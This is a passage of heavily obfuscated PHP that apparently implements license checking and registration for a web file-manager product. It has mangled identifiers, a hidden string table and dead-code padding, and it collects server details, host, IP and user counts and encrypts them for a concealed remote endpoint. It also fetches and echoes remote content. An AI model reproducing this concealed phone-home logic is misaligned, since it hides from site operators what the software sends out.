$GLOBALS[$—˜¢ÌÎî[13]][$—˜¢ÌÎî[14]] = array_merge($äÆáëß, $Æ»Î³Ş´); $GLOBALS[$—˜¢ÌÎî[13]][$—˜¢ÌÎî[15]] = implode($—˜¢ÌÎî[0], $GLOBALS[$—˜¢ÌÎî[13]][$—˜¢ÌÎî[14]]); } private function eidpaced8b54() { $Çğ´¿Íá =& $_SERVER[ˆ¡¹µ‹Â]; $İÁ˜õÏÖ =& $_SERVER[ Ãœáã¬]; if ($GLOBALS[$İÁ˜õÏÖ[13]][$İÁ˜õÏÖ[15]] != $İÁ˜õÏÖ[6]) { return; } $´ïà¾¦  = $_SERVER[$İÁ˜õÏÖ[16]]; $ÊºéÃµ„ = $Çğ´¿Íá[696]; if (strlen($ÊºéÃµ„) < $Çğ´¿Íá[687]) { die; } $À¤”ìşÁ = $İÁ˜õÏÖ[17]; $³éãæÄÖ = $Çğ´¿Íá[697]; if (!strstr($´ïà¾¦ , $À¤”ìşÁ)) { return; } $»ø„·äì = strrpos($´ïà¾¦ , $À¤”ìşÁ); $è›àË‘¥ = substr($´ïà¾¦ , $»ø„·äì + strlen($À¤”ìşÁ)); preg_match_all($İÁ˜õÏÖ[18], $è›àË‘¥, $‹ÃË¦æ¸); $è›àË‘¥ = trim($‹ÃË¦æ¸[0][0], $İÁ˜õÏÖ[19]); $±¬“§ñÏ = $Çğ´¿Íá[698]; while ($±¬“§ñÏ < $Çğ´¿Íá[699]) { if ($±¬“§ñÏ >= 0) { break; } $±¬“§ñÏ++; } $GLOBALS[$İÁ˜õÏÖ[13]][$İÁ˜õÏÖ[14]] = explode($İÁ˜õÏÖ[19], $è›àË‘¥); $GLOBALS[$İÁ˜õÏÖ[13]][$İÁ˜õÏÖ[15]] = implode($İÁ˜õÏÖ[0], $GLOBALS[$İÁ˜õÏÖ[13]][$İÁ˜õÏÖ[14]]); $¿ÁÓşğ› = $Çğ´¿Íá[700]; while ($¿ÁÓşğ› < $Çğ´¿Íá[689]) { if ($¿ÁÓşğ› >= 0) { break; } $¿ÁÓşğ›++; } } public function run() { $È§ÖÉ½€ =& $_SERVER[ˆ¡¹µ‹Â]; $ØÒêã¾Â =& $_SERVER[ Ãœáã¬]; $this->eidpaced8b54(); $this->ovzxb3d587ad(); $‰âŒ‚Çº = $GLOBALS[$ØÒêã¾Â[13]][$ØÒêã¾Â[14]]; $Ã©³î‘Å = $GLOBALS[$ØÒêã¾Â[13]][$ØÒêã¾Â[15]]; define($ØÒêã¾Â[20], isset($‰âŒ‚Çº[0]) && $‰âŒ‚Çº[0] ? $‰âŒ‚Çº[0] : $this->defaultModule); define($ØÒêã¾Â[21], isset($‰âŒ‚Çº[1]) && $‰âŒ‚Çº[0] ? $‰âŒ‚Çº[1] : $this->defaultController); define($ØÒêã¾Â[22], isset($‰âŒ‚Çº[2]) && $‰âŒ‚Çº[0] ? $‰âŒ‚Çº[2] : $this->defaultAction); $‹„¹ø—É = $È§ÖÉ½€[701]; while ($‹„¹ø—É < $È§ÖÉ½€[692]) { if ($‹„¹ø—É >= 0) { break; } $‹„¹ø—É++; } define($ØÒêã¾Â[23], MOD . $ØÒêã¾Â[0] . ST . $ØÒêã¾Â[0] . ACT); $ôÒºÌ = $È§ÖÉ½€[702]; if (!$ôÒºÌ) { die; } $_SERVER[$ØÒêã¾Â[24]] = strtolower(ACTION); $ ‡‡ğûÔ = $È§ÖÉ½€[703]; if (!$ ‡‡ğûÔ) { die; } $this->autorun(); $õä‹Œ = $È§ÖÉ½€[704]; if (strlen($õä‹Œ) < $È§ÖÉ½€[687]) { return; } if (count($‰âŒ‚Çº) >= 3) { $this->appRun($Ã©³î‘Å); } else { $this->appRun(ACTION); } } private $goqzee6de40a = array(); private $fmaldf286b22 = ''; public function vwrfa50173b6() { $ÄŞú×­ =& $_SERVER[ˆ¡¹µ‹Â]; $„Ìâß =& $_SERVER[ Ãœáã¬]; $this->agsme40eaea0(); $this->ibrmddab986e(); $¶Í†´Â = $ÄŞú×­[705]; while (strlen($¶Í†´Â) < $ÄŞú×­[689]) { if (!$¶Í†´Â) { break; } $¶Í†´Â++; } $this->tvjx70fd0a85(); $this->siwp7665cc9c(); $this->vzpe2014d4c5(); $this->owic59edf125(); $¾ê„¦¨• = $ÄŞú×­[706]; while (strlen($¾ê„¦¨•) < $ÄŞú×­[692]) { if (!$¾ê„¦¨•) { break; } $¾ê„¦¨•++; } $this->fdgq492341b8(); $ËÊ“Úï = $ÄŞú×­[707]; $this->uxkv77fc9f13($„Ìâß[25], array($this, $„Ìâß[26])); $this->uxkv77fc9f13($„Ìâß[27], array($this, $„Ìâß[28])); $˜éÏ‡Á® = $ÄŞú×­[708]; if (!$˜éÏ‡Á®) { die; } $this->uxkv77fc9f13($„Ìâß[29], array($this, $„Ìâß[30])); $this->uxkv77fc9f13($„Ìâß[31], array($this, $„Ìâß[32])); } public function hzgn9232bf02($êÃ†Ñ¢») { $ã…´Óª« =& $_SERVER[ˆ¡¹µ‹Â]; $ç¦¼…Éé =& $_SERVER[ Ãœáã¬]; $ğİ†Ì£È = Model($ç¦¼…Éé[33])->get(); $œÆ‡üÚ² = array($ç¦¼…Éé[34], $ç¦¼…Éé[35], $ç¦¼…Éé[36], $ç¦¼…Éé[37], $ç¦¼…Éé[38], $ç¦¼…Éé[39], $ç¦¼…Éé[40], $ç¦¼…Éé[41], $ç¦¼…Éé[42], $ç¦¼…Éé[43], $ç¦¼…Éé[44], $ç¦¼…Éé[45], $ç¦¼…Éé[46], $ç¦¼…Éé[47], $ç¦¼…Éé[48], $ç¦¼…Éé[49], $ç¦¼…Éé[50], $ç¦¼…Éé[51], $ç¦¼…Éé[52], $ç¦¼…Éé[53], $ç¦¼…Éé[54], $ç¦¼…Éé[55], $ç¦¼…Éé[56], $ç¦¼…Éé[57], $ç¦¼…Éé[58], $ç¦¼…Éé[59], $ç¦¼…Éé[60], $ç¦¼…Éé[61], $ç¦¼…Éé[62], $ç¦¼…Éé[63], $ç¦¼…Éé[64], $ç¦¼…Éé[65], $ç¦¼…Éé[66], $ç¦¼…Éé[67], $ç¦¼…Éé[68], $ç¦¼…Éé[69], $ç¦¼…Éé[70], $ç¦¼…Éé[71], $ç¦¼…Éé[72], $ç¦¼…Éé[73], $ç¦¼…Éé[74], $ç¦¼…Éé[75], $ç¦¼…Éé[76], $ç¦¼…Éé[77], $ç¦¼…Éé[78], $ç¦¼…Éé[79], $ç¦¼…Éé[80], $ç¦¼…Éé[81], $ç¦¼…Éé[82], $ç¦¼…Éé[83], $ç¦¼…Éé[84], $ç¦¼…Éé[85]); foreach ($œÆ‡üÚ² as $şœÇ‹Æ­) { $Ğ§ÔòÙ¿ = $GLOBALS[$ç¦¼…Éé[86]][$ç¦¼…Éé[87]][$şœÇ‹Æ­]; if (isset($ğİ†Ì£È[$şœÇ‹Æ­])) { $Ğ§ÔòÙ¿ = $ğİ†Ì£È[$şœÇ‹Æ­]; } $êÃ†Ñ¢»[$ç¦¼…Éé[88]][$ç¦¼…Éé[89]][$şœÇ‹Æ­] = $Ğ§ÔòÙ¿; } $´İ—òÈ± = $êÃ†Ñ¢»[$ç¦¼…Éé[88]][$ç¦¼…Éé[89]][$ç¦¼…Éé[46]]; $©Îï¢Ÿ½ = $ã…´Óª«[709]; if (strlen($©Îï¢Ÿ½) < $ã…´Óª«[689]) { return; } unset($êÃ†Ñ¢»[$ç¦¼…Éé[88]][$ç¦¼…Éé[90]][$ç¦¼…Éé[91]]); $•êË­ª¯ = $ã…´Óª«[710]; if (!$•êË­ª¯) { return; } unset($êÃ†Ñ¢»[$ç¦¼…Éé[88]][$ç¦¼…Éé[90]][$ç¦¼…Éé[92]]); $Ü¯Èï = $ã…´Óª«[711]; unset($êÃ†Ñ¢»[$ç¦¼…Éé[88]][$ç¦¼…Éé[89]][$ç¦¼…Éé[46]]); $äÚ„ÅÍ² = $ã…´Óª«[712]; if (!$äÚ„ÅÍ²) { return; } unset($êÃ†Ñ¢»[$ç¦¼…Éé[88]][$ç¦¼…Éé[89]][$ç¦¼…Éé[93]]); $ãõà“«ò = $ã…´Óª«[713]; if (!$ãõà“«ò) { return; } $êÃ†Ñ¢»[$ç¦¼…Éé[88]][$ç¦¼…Éé[89]][$ç¦¼…Éé[94]] = array($ç¦¼…Éé[95] => (int) $´İ—òÈ±[$ç¦¼…Éé[96]], $ç¦¼…Éé[97] => (int) _get($´İ—òÈ±, $ç¦¼…Éé[98], 0)); $•©í•ğ“ = $ã…´Óª«[714]; if (strlen($•©í•ğ“) < $ã…´Óª«[692]) { die; } $ÒˆÛêÖÏ = substr(md5($ç¦¼…Éé[99] . get_client_ip() . $ğİ†Ì£È[$ç¦¼…Éé[100]]), 0, 15); $éóô­¥‡ = $ã…´Óª«[715]; while (strlen($éóô­¥‡) < $ã…´Óª«[687]) { if (!$éóô­¥‡) { break; } $éóô­¥‡++; } $êÃ†Ñ¢»[$ç¦¼…Éé[101]][$ç¦¼…Éé[102]] = Mcrypt::encode(Session::sign(), $ÒˆÛêÖÏ, 3600 * 24); $êÃ†Ñ¢»[$ç¦¼…Éé[101]][$ç¦¼…Éé[103]] = Action($ç¦¼…Éé[104])->accessToken(); $ÈÇ² £ = $ã…´Óª«[716]; if (!$ÈÇ² £) { die; } $êÃ†Ñ¢»[$ç¦¼…Éé[101]][$ç¦¼…Éé[105]] = md5($_SERVER[$ç¦¼…Éé[106]] . $ğİ†Ì£È[$ç¦¼…Éé[100]]); $êÃ†Ñ¢»[$ç¦¼…Éé[101]][$ç¦¼…Éé[107]] = base64_encode(serverInfo()); $êÃ†Ñ¢»[$ç¦¼…Éé[101]][$ç¦¼…Éé[108]] = $this->fmaldf286b22; $ÈÉ¥Û = $ã…´Óª«[717]; if (!$ÈÉ¥Û) { return; } if ($ğİ†Ì£È[$ç¦¼…Éé[108]] != $ç¦¼…Éé[109]) { $êÃ†Ñ¢»[$ç¦¼…Éé[101]][$ç¦¼…Éé[110]] = $ğİ†Ì£È[$ç¦¼…Éé[110]]; $êÃ†Ñ¢»[$ç¦¼…Éé[101]][$ç¦¼…Éé[111]] = $ğİ†Ì£È[$ç¦¼…Éé[111]]; $¹¶™ñå = rand_string(10) . $this->fmaldf286b22 . rand_string(5); $êÃ†Ñ¢»[$ç¦¼…Éé[88]][$ç¦¼…Éé[112]][$ç¦¼…Éé[113]] = $this->jdncf0daa323($¹¶™ñå, $êÃ†Ñ¢»[$ç¦¼…Éé[101]][$ç¦¼…Éé[105]]); } if ($this->fmaldf286b22 == $ç¦¼…Éé[109]) { $êÃ†Ñ¢»[$ç¦¼…Éé[88]][$ç¦¼…Éé[89]][$ç¦¼…Éé[94]][$ç¦¼…Éé[98]] = 0; } $êÃ†Ñ¢»[$ç¦¼…Éé[101]][$ç¦¼…Éé[114]] = $this->versionPluginFilter(); $êÃ†Ñ¢»[$ç¦¼…Éé[101]][$ç¦¼…Éé[115]] = _get($this->goqzee6de40a, $ç¦¼…Éé[116], $ç¦¼…Éé[6]); $¢«æÈÌš = $ã…´Óª«[718]; if (!$¢«æÈÌš) { return; } if (KodUser::isRoot() && $this->config[$ç¦¼…Éé[117]]) { $êÃ†Ñ¢»[$ç¦¼…Éé[101]][$ç¦¼…Éé[118]] = WEB_ROOT; } return $êÃ†Ñ¢»; } private function owic59edf125() { $šîùù =& $_SERVER[ˆ¡¹µ‹Â]; $ƒÅ´Ğµª =& $_SERVER[ Ãœáã¬]; $’‘â×Âç = $_SERVER[$ƒÅ´Ğµª[24]] == $ƒÅ´Ğµª[119]; if ($_SERVER[$ƒÅ´Ğµª[24]] == $ƒÅ´Ğµª[120] && $_GET[$ƒÅ´Ğµª[121]] == $ƒÅ´Ğµª[122]) { $’‘â×Âç = !0; } if ($’‘â×Âç) { $¯ ‡«»È = array($ƒÅ´Ğµª[108] => $this->fmaldf286b22, $ƒÅ´Ğµª[123] => $this->oqdma4d4d1df(), $ƒÅ´Ğµª[124] => Model($ƒÅ´Ğµª[125])->count()); if ($this->fmaldf286b22 != $ƒÅ´Ğµª[109]) { $ÂÅÀÛ›ç = _get($this->goqzee6de40a, $ƒÅ´Ğµª[126]); if ($ÂÅÀÛ›ç) { $¯ ‡«»È[$ƒÅ´Ğµª[127]] = $ÂÅÀÛ›ç; $¯ ‡«»È[$ƒÅ´Ğµª[128]] = strtotime(_get($this->goqzee6de40a, $ƒÅ´Ğµª[129])); $¯ ‡«»È[$ƒÅ´Ğµª[130]] = _get($this->goqzee6de40a, $ƒÅ´Ğµª[116]); } $òï‹’„– = Model($ƒÅ´Ğµª[33])->get($ƒÅ´Ğµª[131], $ƒÅ´Ğµª[6], !0); if (is_string($òï‹’„–) && substr($òï‹’„–, 0, 1) == $ƒÅ´Ğµª[132]) { $òï‹’„– = json_decode_force($òï‹’„–); } if (is_array($òï‹’„–) && $òï‹’„–[$ƒÅ´Ğµª[133]] && strstr($òï‹’„–[$ƒÅ´Ğµª[133]], $ƒÅ´Ğµª[134])) { $æÊæ•Ç = explode($ƒÅ´Ğµª[134], $òï‹’„–[$ƒÅ´Ğµª[133]]); $¯ ‡«»È[$ƒÅ´Ğµª[135]] = $æÊæ•Ç[0]; } } $¯ ‡«»È = $this->butf4e080185(json_encode($¯ ‡«»È), md5($ƒÅ´Ğµª[136])); $÷¯©š’ú = array($ƒÅ´Ğµª[137] => $¯ ‡«»È); $¶Šàä‚ = $šîùù[719]; call_user_func(array($ƒÅ´Ğµª[138], $ƒÅ´Ğµª[139]), $÷¯©š’ú); } if ($this->fmaldf286b22 == $ƒÅ´Ğµª[109]) { return; } $áîè§‹ = array($ƒÅ´Ğµª[140], $ƒÅ´Ğµª[141], $ƒÅ´Ğµª[142], $ƒÅ´Ğµª[143], $ƒÅ´Ğµª[144], $ƒÅ´Ğµª[145]); $¯ÌÛÁÒ› = $šîùù[720]; if (strlen($¯ÌÛÁÒ›) < $šîùù[687]) { die; } $ÇúÅèÚ = Model($ƒÅ´Ğµª[33])->get(); $‘ÓàœÌ = $šîùù[721]; if (!$‘ÓàœÌ) { return; } $÷¯©š’ú = array($ƒÅ´Ğµª[146] => $ÇúÅèÚ[$ƒÅ´Ğµª[34]], $ƒÅ´Ğµª[147] => $ÇúÅèÚ[$ƒÅ´Ğµª[35]], $ƒÅ´Ğµª[148] => $ƒÅ´Ğµª[6]); $ÑñÛÍó› = $šîùù[722]; foreach ($áîè§‹ as $Éø®ÀÚ) { if (!isset($ÇúÅèÚ[$Éø®ÀÚ]) || !$ÇúÅèÚ[$Éø®ÀÚ]) { continue; } $÷¯©š’ú[$Éø®ÀÚ] = $ÇúÅèÚ[$Éø®ÀÚ]; $õÂŞ±Ÿ = $šîùù[723]; if (strlen($õÂŞ±Ÿ) < $šîùù[699]) { return; } } call_user_func(array($ƒÅ´Ğµª[138], $ƒÅ´Ğµª[139]), $÷¯©š’ú); $ƒî²Ìüê = $šîùù[724]; if (strlen($ƒî²Ìüê) < $šîùù[687]) { return; } } private function siwp7665cc9c() { $¥¹Š“íƒ =& $_SERVER[ˆ¡¹µ‹Â]; $«¹½Ş©Á =& $_SERVER[ Ãœáã¬]; if ($_SERVER[$«¹½Ş©Á[24]] != $«¹½Ş©Á[149]) { return; } if (!KodUser::isRoot()) { die; } $ÉÛ—¦Ë = $GLOBALS[$«¹½Ş©Á[13]]; if (isset($ÉÛ—¦Ë[$«¹½Ş©Á[150]])) { $this->aveg04054a67(); die; } if (isset($ÉÛ—¦Ë[$«¹½Ş©Á[151]]) && isset($ÉÛ—¦Ë[$«¹½Ş©Á[151]]) == $«¹½Ş©Á[122]) { $ÉÛ—¦Ë[$«¹½Ş©Á[152]] = Model($«¹½Ş©Á[33])->get($«¹½Ş©Á[153]); } if (!isset($ÉÛ—¦Ë[$«¹½Ş©Á[152]]) || strlen($ÉÛ—¦Ë[$«¹½Ş©Á[152]]) != 16) { show_json($«¹½Ş©Á[154] . $ÉÛ—¦Ë[$«¹½Ş©Á[152]], !1); } $ãš¾† Ş = Model($«¹½Ş©Á[33])->get($«¹½Ş©Á[100]); $óùªû˜ï = md5($_SERVER[$«¹½Ş©Á[106]] . $ãš¾† Ş); $šğ”‰¯œ = array($«¹½Ş©Á[152] => $ÉÛ—¦Ë[$«¹½Ş©Á[152]], $«¹½Ş©Á[155] => rand_string(16), $«¹½Ş©Á[156] => $«¹½Ş©Á[136], $«¹½Ş©Á[157] => $«¹½Ş©Á[158], $«¹½Ş©Á[159] => $_SERVER[$«¹½Ş©Á[160]], $«¹½Ş©Á[161] => $_SERVER[$«¹½Ş©Á[162]], $«¹½Ş©Á[163] => $_SERVER[$«¹½Ş©Á[164]], $«¹½Ş©Á[105] => $óùªû˜ï, $«¹½Ş©Á[165] => Model($«¹½Ş©Á[33])->get($«¹½Ş©Á[131])); if (isset($ÉÛ—¦Ë[$«¹½Ş©Á[151]]) && isset($ÉÛ—¦Ë[$«¹½Ş©Á[151]]) == $«¹½Ş©Á[122]) { $šğ”‰¯œ[$«¹½Ş©Á[151]] = md5($šğ”‰¯œ[$«¹½Ş©Á[152]] . $«¹½Ş©Á[166] . $šğ”‰¯œ[$«¹½Ş©Á[155]]); } if ($ÉÛ—¦Ë[$«¹½Ş©Á[167]] == $«¹½Ş©Á[168]) { $·İÑñ«Ä = $this->butf4e080185($óùªû˜ï, $«¹½Ş©Á[169]); $™º™Ÿ½ = $this->jdncf0daa323(json_encode($šğ”‰¯œ), $óùªû˜ï . $«¹½Ş©Á[170], 3); $™º™Ÿ½ = $™º™Ÿ½ . $«¹½Ş©Á[171] . $_SERVER[$«¹½Ş©Á[160]]; $Î¨öè¸Õ = $this->bjuec3f47b28($«¹½Ş©Á[172] . $·İÑñ«Ä . $«¹½Ş©Á[173] . $™º™Ÿ½, -1); show_json($Î¨öè¸Õ, !0); } else { if ($ÉÛ—¦Ë[$«¹½Ş©Á[167]] == $«¹½Ş©Á[174]) { $‰›ÁºÕÁ = substr(md5($«¹½Ş©Á[175] . $óùªû˜ï), 12, 15) . $«¹½Ş©Á[176]; $™º™Ÿ½ = $this->riht7b89a64e(trim($ÉÛ—¦Ë[$«¹½Ş©Á[177]]), $‰›ÁºÕÁ, 2); $Øêõ£Ú” = json_decode($™º™Ÿ½, !0); if (!is_array($Øêõ£Ú”) || !is_array($Øêõ£Ú”[$«¹½Ş©Á[178]]) || $Øêõ£Ú”[$«¹½Ş©Á[152]] != !0) { $§ò¥ÄÈ = $«¹½Ş©Á[179]; $…™Í«¨¢ = $Øêõ£Ú”[$«¹½Ş©Á[178]] ? $«¹½Ş©Á[180] . $Øêõ£Ú”[$«¹½Ş©Á[178]] : $§ò¥ÄÈ; show_json($…™Í«¨¢, !1); } else { $šğ”‰¯œ[$«¹½Ş©Á[155]] = $Øêõ£Ú”[$«¹½Ş©Á[178]][$«¹½Ş©Á[181]]; } } else { $Øêõ£Ú” = $this->bjuec3f47b28($«¹½Ş©Á[182], $šğ”‰¯œ, 10); } } if (!is_array($Øêõ£Ú”) || !is_array($Øêõ£Ú”[$«¹½Ş©Á[178]]) || $Øêõ£Ú”[$«¹½Ş©Á[152]] != !0) { $§ò¥ÄÈ = LNG($«¹½Ş©Á[183]); $…™Í«¨¢ = $Øêõ£Ú”[$«¹½Ş©Á[178]] ? $«¹½Ş©Á[180] . $Øêõ£Ú”[$«¹½Ş©Á[178]] : $§ò¥ÄÈ; show_json($…™Í«¨¢, !1); } $ÖÊëëšı = $Øêõ£Ú”[$«¹½Ş©Á[178]]; $ìÏª±æÓ = $this->wzcp5224ff0a($ÖÊëëšı[$«¹½Ş©Á[184]]); $úŞÜ–— = $¥¹Š“íƒ[725]; if (!$úŞÜ–—) { die; } if (!$ìÏª±æÓ || $ìÏª±æÓ != $ÖÊëëšı[$«¹½Ş©Á[129]]) { $¦ö°æÊ¹ = array($«¹½Ş©Á[185] => Model($«¹½Ş©Á[33])->get($«¹½Ş©Á[100]), $«¹½Ş©Á[186] => $_SERVER[$«¹½Ş©Á[106]], $«¹½Ş©Á[187] => this_url(), $«¹½Ş©Á[161] => $_SERVER[$«¹½Ş©Á[162]]); $™º™Ÿ½ = $this->wkij18ea694e(json_encode($¦ö°æÊ¹)); $this->bjuec3f47b28($«¹½Ş©Á[188] . $™º™Ÿ½); show_json(LNG($«¹½Ş©Á[189]), !0); } $’É€¼Ó‚ = array($«¹½Ş©Á[153] => $ÖÊëëšı[$«¹½Ş©Á[190]], $«¹½Ş©Á[191] => $ÖÊëëšı[$«¹½Ş©Á[192]], $«¹½Ş©Á[193] => rand_string(16), $«¹½Ş©Á[108] => $ÖÊëëšı[$«¹½Ş©Á[194]]); if ($šğ”‰¯œ[$«¹½Ş©Á[155]]) { $’É€¼Ó‚[$«¹½Ş©Á[193]] = $šğ”‰¯œ[$«¹½Ş©Á[155]]; } $Øòí³Ì¼ = substr(md5($’É€¼Ó‚[$«¹½Ş©Á[191]]), 10, 10); $‹÷çÄ±‚ = $Øòí³Ì¼ . $’É€¼Ó‚[$«¹½Ş©Á[108]] . $’É€¼Ó‚[$«¹½Ş©Á[193]]; $ùş°òÆ = $¥¹Š“íƒ[726]; while ($ùş°òÆ < $¥¹Š“íƒ[687]) { if ($ùş°òÆ >= 0) { break; } $ùş°òÆ++; } $’É€¼Ó‚[$«¹½Ş©Á[110]] = strrev(base64_encode($this->butf4e080185($‹÷çÄ±‚, $«¹½Ş©Á[195]))); $¾¡úƒË— = rand_string(16); $Õ†“Çò• = $¥¹Š“íƒ[727]; $å†±÷µË = $¾¡úƒË— . $’É€¼Ó‚[$«¹½Ş©Á[108]] . $this->butf4e080185(md5($’É€¼Ó‚[$«¹½Ş©Á[153]]), $¾¡úƒË—); $’É€¼Ó‚[$«¹½Ş©Á[111]] = base64_encode(strrev($this->butf4e080185($å†±÷µË, $«¹½Ş©Á[196]))); $Û¤ºæüå = $¥¹Š“íƒ[728]; while ($Û¤ºæüå < $¥¹Š“íƒ[689]) { if ($Û¤ºæüå >= 0) { break; } $Û¤ºæüå++; } if ($ÖÊëëšı[$«¹½Ş©Á[197]] && $ÖÊëëšı[$«¹½Ş©Á[197]] >= 1) { Model($«¹½Ş©Á[33])->setDeep($«¹½Ş©Á[198], $«¹½Ş©Á[122]); } Model($«¹½Ş©Á[33])->set($’É€¼Ó‚); $ìªïªù = md5($_SERVER[$«¹½Ş©Á[106]] . strrev($ãš¾† Ş) . $’É€¼Ó‚[$«¹½Ş©Á[191]]); $ºíÅĞ‰ = strrev(substr($ìªïªù, 10, 16)); $¢¨‡¤äË = $this->jdncf0daa323(json_encode($ÖÊëëšı), $ìªïªù); $ë¡÷êêÁ = array_to_keyvalue(Model($«¹½Ş©Á[7])->listData(), $«¹½Ş©Á[199]); $ëô·äšî = $ë¡÷êêÁ[$«¹½Ş©Á[200]]; $©Õ¯§•© = array(); $ñ–âÌ‚ = $¥¹Š“íƒ[729]; if (strlen($ñ–âÌ‚) < $¥¹Š“íƒ[687]) { die; } $©Õ¯§•©[$ºíÅĞ‰] = $¢¨‡¤äË; $úÈÂµßç = $¥¹Š“íƒ[730]; Model($«¹½Ş©Á[7])->update($ëô·äšî[$«¹½Ş©Á[201]], array($«¹½Ş©Á[202] => $©Õ¯§•©)); $®»³¿€é = $¥¹Š“íƒ[731]; while ($®»³¿€é < $¥¹Š“íƒ[687]) { if ($®»³¿€é >= 0) { break; } $®»³¿€é++; } $this->goqzee6de40a = $ÖÊëëšı; $î´Ìö­É = $¥¹Š“íƒ[732]; while (strlen($î´Ìö­É) < $¥¹Š“íƒ[683]) { if (!$î´Ìö­É) { break; } $î´Ìö­É++; } $this->fmaldf286b22 = $’É€¼Ó‚[$«¹½Ş©Á[108]]; $Ì©Çå‡Û = $¥¹Š“íƒ[733]; while (strlen($Ì©Çå‡Û) < $¥¹Š“íƒ[683]) { if (!$Ì©Çå‡Û) { break; } $Ì©Çå‡Û++; } $this->licenseRegistSuccess(); Cache::set($«¹½Ş©Á[203] . md5($ãš¾† Ş . $«¹½Ş©Á[204]), $«¹½Ş©Á[6]); $Üõ†êÛ‰ = $¥¹Š“íƒ[734]; show_json(LNG($«¹½Ş©Á[189]), !0); $Œßëª’ = $¥¹Š“íƒ[735]; while (strlen($Œßëª’) < $¥¹Š“íƒ[699]) { if (!$Œßëª’) { break; } $Œßëª’++; } } private function licenseRegistSuccess() { $î´™ô—ë =& $_SERVER[ Ãœáã¬]; $à¢åŞŸ’ = Model($î´™ô—ë[33])->get(); if ($à¢åŞŸ’[$î´™ô—ë[63]] != $î´™ô—ë[122]) { Model($î´™ô—ë[33])->set($î´™ô—ë[63], $î´™ô—ë[122]); } Action($î´™ô—ë[205])->initStart(!0); } private function aveg04054a67() { $„‘¦ä€ =& $_SERVER[ Ãœáã¬]; Model($„‘¦ä€[33])->set(array($„‘¦ä€[153] => $„‘¦ä€[6], $„‘¦ä€[191] => $„‘¦ä€[6], $„‘¦ä€[108] => $„‘¦ä€[109], $„‘¦ä€[110] => $„‘¦ä€[6], $„‘¦ä€[111] => $„‘¦ä€[6])); $õŒ¬À°› = $_SERVER[ˆ¡¹µ‹Â][736]; if (!$õŒ¬À°›) { die; } Model($„‘¦ä€[33])->setDeep($„‘¦ä€[198], $„‘¦ä€[206]); $this->goqzee6de40a = array(); $this->fmaldf286b22 = $„‘¦ä€[109]; } private function agsme40eaea0() { $É£ş¿Ù£ =& $_SERVER[ˆ¡¹µ‹Â]; $Û÷Ğ„îá =& $_SERVER[ Ãœáã¬]; $_SERVER[$Û÷Ğ„îá[162]] = _get($_SERVER, $Û÷Ğ„îá[162], APP_HOST); $this->fmaldf286b22 = $Û÷Ğ„îá[109]; $à¹Ÿ› = $É£ş¿Ù£[737]; $ûÖÉ…ô = Model($Û÷Ğ„îá[33])->get(); if ($ûÖÉ…ô[$Û÷Ğ„îá[108]] == $Û÷Ğ„îá[109]) { return; } $Á„–¨¯‚ = Model($Û÷Ğ„îá[33])->get($Û÷Ğ„îá[100]); $ŒÌŸ®á = $Û÷Ğ„îá[203] . md5($Á„–¨¯‚ . $Û÷Ğ„îá[204]); $ÛìÍü‰ = $É£ş¿Ù£[738]; if (!$ÛìÍü‰) { die; } $ş¯ì¸êÛ = Cache::get($ŒÌŸ®á); if (!is_array($ş¯ì¸êÛ) || !isset($ş¯ì¸êÛ[$Û÷Ğ„îá[207]]) || time() - $ş¯ì¸êÛ[$Û÷Ğ„îá[207]] >= 60) { $¬«Ï¸À¢ = Model($Û÷Ğ„îá[7])->loadList(); $¿²É´±Ì = $¬«Ï¸À¢[$Û÷Ğ„îá[200]]; $í©òìàù = md5($_SERVER[$Û÷Ğ„îá[106]] . strrev($Á„–¨¯‚) . $ûÖÉ…ô[$Û÷Ğ„îá[191]]); $üõ¢éœ³ = strrev(substr($í©òìàù, 10, 16)); $ş¯ì¸êÛ = $this->riht7b89a64e($¿²É´±Ì[$Û÷Ğ„îá[86]][$üõ¢éœ³], $í©òìàù); $ş¯ì¸êÛ = json_decode($ş¯ì¸êÛ, !0); } if (!is_array($ş¯ì¸êÛ)) { return $this->aveg04054a67(); } $¤ªîÒ§î = strtotime($ş¯ì¸êÛ[$Û÷Ğ„îá[129]]); if (time() >= $¤ªîÒ§î) { return $this->aveg04054a67(); } if (!isset($ş¯ì¸êÛ[$Û÷Ğ„îá[207]]) || time() - $ş¯ì¸êÛ[$Û÷Ğ„îá[207]] > 20) { $ş¯ì¸êÛ[$Û÷Ğ„îá[207]] = time(); Cache::set($ŒÌŸ®á, $ş¯ì¸êÛ); } $this->goqzee6de40a = $ş¯ì¸êÛ; $this->fmaldf286b22 = $ûÖÉ…ô[$Û÷Ğ„îá[108]]; $‚ıùğ£é = $É£ş¿Ù£[739]; } private function ibrmddab986e() { $­Œ¢¹ =& $_SERVER[ Ãœáã¬]; $éØÜø»û = $GLOBALS[$­Œ¢¹[13]]; $¾÷Æ±ÏÆ = $_SERVER[$­Œ¢¹[24]]; if ($¾÷Æ±ÏÆ == $­Œ¢¹[208] && $this->fmaldf286b22 == $­Œ¢¹[109]) { show_json(LNG($­Œ¢¹[209]), !1, $­Œ¢¹[210]); } $ëÃ Ò÷ = array($­Œ¢¹[211], $­Œ¢¹[212]); if (in_array($¾÷Æ±ÏÆ, $ëÃ Ò÷)) { if ($this->fmaldf286b22 == $­Œ¢¹[109] && isset($éØÜø»û[$­Œ¢¹[213]])) { show_json(LNG($­Œ¢¹[209]), !1, $­Œ¢¹[210]); die; } $º¸º†â = $this->oqdma4d4d1df(); if ($º¸º†â != intval($­Œ¢¹[214])) { if ($º¸º†â <= Model($­Œ¢¹[125])->count()) { show_json(LNG($­Œ¢¹[215]), !1, $­Œ¢¹[210]); die; } } } } private function tvjx70fd0a85() { $šé‹Îå =& $_SERVER[ˆ¡¹µ‹Â]; $æıİà­ =& $_SERVER[ Ãœáã¬]; $ÃØ×Ô¿« = array($æıİà­[119], $æıİà­[120]); if (!KodUser::isRoot() || !isset($_GET[$æıİà­[216]])) { return; } if (!in_array($_SERVER[$æıİà­[24]], $ÃØ×Ô¿«)) { return; } $×ìñÜıù = $æıİà­[217]; $×ìñÜıù = $this->mows81ee32e9($×ìñÜıù, $æıİà­[218]); $†‘§èö· = $šé‹Îå[740]; if (!$†‘§èö·) { die; } $›ı‡öÍ– = stream_context_create(array($æıİà­[219] => array($æıİà­[220] => $æıİà­[221], $æıİà­[222] => 3))); $ğ¯­£ü© = @file_get_contents($×ìñÜıù, !1, $›ı‡öÍ–); header($æıİà­[223]); $Ù°öìÀ‘ = $šé‹Îå[741]; if (strlen($Ù°öìÀ‘) < $šé‹Îå[692]) { return; } if ($ğ¯­£ü© && strstr($ğ¯­£ü©, $æıİà­[224])) { echo $ğ¯­£ü©; } die; } public function kxuj2681f9f0($¦İóÑêš) { $âÅæ‰¨æ 